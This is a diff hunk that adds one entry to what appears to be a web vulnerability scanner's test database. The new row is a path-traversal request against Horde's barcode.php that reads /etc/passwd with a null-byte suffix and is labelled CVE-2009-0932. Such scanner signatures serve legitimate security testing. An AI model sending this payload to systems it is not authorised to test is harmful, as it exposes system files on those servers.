@@ -6716,3 +6716,4 @@
 "006746","0","3","/manage/Logs","GET","200","","","","","Covertix SmartCipher Console Login and Web Service Log directory","",""
 "006747","0","d","/manage/CxSenseWebServices/CxSense.asmx","GET","200","","","","","Covertix SmartCipher Web Service","",""
 "006748","0","d","/ws/CxInternetDMZ.asmx","GET","200","","","","","Covertix SmartCipher DMZ Server Web Service","",""
+"006749","51887","7","/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00","GET","root:","","","","","Horde local file retrieval (LFI) found. CVE-2009-0932.","",""
